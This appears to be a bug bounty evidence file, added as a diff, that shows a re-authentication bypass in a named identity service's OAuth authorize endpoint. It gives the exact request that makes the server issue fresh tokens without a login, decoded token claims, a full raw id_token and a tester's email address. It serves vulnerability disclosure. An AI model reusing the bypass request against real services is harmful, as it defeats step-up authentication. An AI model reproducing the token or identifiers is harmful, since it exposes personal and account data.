@@ -1,0 +1,121 @@
+## Evidence: max_age=0 Enforcement Bypass via suppressed_max_age Parameter
+## Tested: 2026-06-09 on identity.stage.vismaonline.com (staging) + identity.vismaonline.com (production)
+## Tester: adityasrikar1304@gmail.com (test account — no special privileges)
+
+=============================================================================
+STEP 1: Confirm normal max_age=0 behavior (login redirect expected)
+=============================================================================
+
+REQUEST:
+GET /connect/authorize?client_id=visma.online.administration
+  &redirect_uri=https%3A%2F%2Fadmin.stage.vismaonline.com
+  &response_type=id_token%20token
+  &scope=openid%20profile
+  &state=S1
+  &response_mode=form_post
+  &nonce=N1
+  &max_age=0
+Host: identity.stage.vismaonline.com
+
+RESPONSE (302 Found):
+Location: https://identity.stage.vismaonline.com/login?ReturnUrl=%2Fconnect%2Fauthorize%3F
+  ...max_age%3D0%26suppressed_max_age%3D0...
+
+OBSERVATION:
+Server redirects to login page (correct — max_age=0 forces re-auth).
+BUT the redirect URL contains a non-standard parameter: suppressed_max_age=0
+This parameter is injected by the server's own pipeline when processing max_age=0.
+
+=============================================================================
+STEP 2: Bypass — send suppressed_max_age=0 directly (WITHOUT max_age)
+=============================================================================
+
+REQUEST:
+GET /connect/authorize?client_id=visma.online.administration
+  &redirect_uri=https%3A%2F%2Fadmin.stage.vismaonline.com
+  &response_type=id_token%20token
+  &scope=openid%20profile
+  &state=S1
+  &response_mode=form_post
+  &nonce=N2
+  &suppressed_max_age=0
+Host: identity.stage.vismaonline.com
+Cookie: [authenticated session cookies — same session, NO re-authentication performed]
+
+RESPONSE (200 OK with auto-submitting form):
+<form method='post' action='https://admin.stage.vismaonline.com'>
+  <input name='id_token' value='eyJhbGciOiJSUzI1NiIsImtpZC...' />
+  <input name='access_token' value='eyJhbGciOiJSUzI1NiIsImtpZC...' />
+  <input name='expires_in' value='300' />
+  ...
+</form>
+
+OBSERVATION:
+Server issues a FRESH TOKEN without requiring re-authentication.
+max_age=0 should require auth_time == now (within seconds).
+This token has auth_time 2275 seconds BEFORE token issuance.
+
+=============================================================================
+STEP 3: JWT Decoded — Stale auth_time Confirmed
+=============================================================================
+
+ID Token Claims (decoded from bypass response):
+{
+  "iss": "https://identity.vismaonline.com",
+  "iat": 1781046806,
+  "nbf": 1781046806,
+  "exp": 1781082806,
+  "aud": "visma.online.administration",
+  "sub": "58679ba6-9bd7-4c6e-80fb-ff3d86396652",
+  "auth_time": 1781044531,   <-- USER'S LAST ACTUAL LOGIN
+  "amr": ["external"],
+  "idp": "VismaConnect",
+  "sid": "29db947e-a7d0-4dcf-b42d-fd3a8ff94927"
+}
+
+MATH:
+  iat        = 1781046806  (token issued at)
+  auth_time  = 1781044531  (user last authenticated at)
+  difference = 2275 seconds = 37.9 minutes
+
+max_age=0 requires: (iat - auth_time) <= 0 seconds (re-auth NOW)
+actual:             (iat - auth_time) = 2275 seconds (38 minutes stale)
+
+VERDICT: max_age=0 enforcement completely bypassed.
+A relying party sending max_age=0 to force step-up re-authentication will
+receive a token with an auth_time that is 38 minutes stale — the user
+was NOT re-authenticated.
+
+=============================================================================
+RAW TOKENS (for triager verification)
+=============================================================================
+
+id_token:
+eyJhbGciOiJSUzI1NiIsImtpZCI6Iml3VFlpRXZrUUZXVUJDSkgzb0NRcC1HaGNOVSIsIng1dCI6Iml3VFlpRXZrUUZXVUJDSkgzb0NRcC1HaGNOVSIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJodHRwczovL2lkZW50aXR5LnZpc21hb25saW5lLmNvbSIsIm5iZiI6MTc4MTA0NjgwNiwiaWF0IjoxNzgxMDQ2ODA2LCJleHAiOjE3ODEwODI4MDYsImF1ZCI6InZpc21hLm9ubGluZS5hZG1pbmlzdHJhdGlvbiIsImFtciI6WyJleHRlcm5hbCJdLCJub25jZSI6Ik4yIiwiYXRfaGFzaCI6IjYwb3NkVVIwa3pSeHNHbm5BQlI2OEEiLCJzaWQiOiIyOWRiOTQ3ZS1hN2QwLTRkY2YtYjQyZC1mZDNhOGZmOTQ5MjciLCJzdWIiOiI1ODY3OWJhNi05YmQ3LTRjNmUtODBmYi1mZjNkODYzOTY2NTIiLCJhdXRoX3RpbWUiOjE3ODEwNDQ1MzEsImlkcCI6IlZpc21hQ29ubmVjdCIsIm5hbWUiOiJidWcgYm91bnR5IiwiZ2l2ZW5fbmFtZSI6ImJ1ZyIsImZhbWlseV9uYW1lIjoiYm91bnR5IiwiaHR0cDovL3Zpc21hb25saW5lLmNvbS9jbGFpbXR5cGVzL2VtcGxveWVlX2lkIjoiMTUyZDA3ZDgtOGU1Ni00NmNhLTlmYTEtMzYzMzE1ZDlmMzIyIiwiaHR0cDovL3Zpc21hb25saW5lLmNvbS9jbGFpbXR5cGVzL2N1c3RvbWVyX2lkIjoiNDBmZjNlZGMtNjUzNS00YzMyLThhODgtMDk3ZGQ4MDNjMDY0IiwiaHR0cDovL3Zpc21hb25saW5lLmNvbS9jbGFpbXR5cGVzL2N1c3RvbWVyX25hbWUiOiJidWcgYm91bnR5IFx1MDBGNnZuaW5nc2JvbGFnIiwiY3VzdG9tZXJfY291bnRyeSI6IjI4MzNiODBkLTE5N2UtNDQ3YS04MWQ2LTViOGVjOTI3NDllZSJ9.emuGodGds28eCNi9vfdYz8aKJxQd0N63SUsNEQwlqFMoc1Hdh3CFlx7srAvELedvqc2GmUO7DYxrf1mYATbekEjiwxLikffiwVlDUl_kTx7CvDgRMdV5y_z4_7MMb1gYvmzjOXPYjXpvRBnZGWqzMEmHwnqAc3jlGW4KpkYtEnIKUcrFI53SffcloRLq1aGu1mgPTFcjyR76wnE8So16XHg9NXZ36p9D1yQZcQL_DzzBb7FlFWn4_aTLSnFjYQ529XMy18ErNI9Klt0rg_qDK_46q84DWJLQCvWJeg7YfAvFwbExevlbGh1xZPC5Y8EselxVTAs7KiwEXWr8gTaL3HmSOOAJFz2KaB7sEBiipWl-w-ZwSn9ir0IXYKrQkisLc5xIItD_1kgiVQ5XERduQXNERnfOzjTHjSMJ7VOhujS7-83ls-Bi2sLmjjpb_4ZEKRdWiRHI_MwmnjPiL1oJ_jH2QO5ahP-NVzUgWHTYqFMWvB5mfZSy_Pwq5qF0Nz7JcYZbKUkAoQ09terV6Chn4kUUPmny6PtyT4XO6XfbQT68QZZBKqXv98hzr9C5USlTFbXoFjtIW3kmPSArs4LtMH1XCfv3OiXTWUsMwprk2mvtzTfxZqRedFh-mKoI128tsQD9C7I9nfo1s0oBswtACl5Fgc3sN1hWGds4lQ-b2J4
+
+Decode at: https://jwt.io
+Expected: auth_time=1781044531, iat=1781046806 (2275s gap)
+
+=============================================================================
+PRODUCTION CONFIRMATION (identity.vismaonline.com)
+=============================================================================
+
+REQUEST:
+GET /connect/authorize?client_id=visma.online.administration
+  &redirect_uri=https%3A%2F%2Fadmin.vismaonline.com
+  &response_type=id_token%20token
+  &scope=openid%20profile
+  &state=S1
+  &response_mode=form_post
+  &nonce=N1
+  &max_age=0
+Host: identity.vismaonline.com
+
+RESPONSE (302 Found):
+Location: https://identity.vismaonline.com/login?ReturnUrl=
+  ...max_age%3D0%26suppressed_max_age%3D0
+
+OBSERVATION:
+Production ALSO injects suppressed_max_age=0 into its login redirect.
+The same bypass is reachable on production with an authenticated session.
+Full bypass execution (Steps 2-3) confirmed on staging; Step 1 confirmed on both.
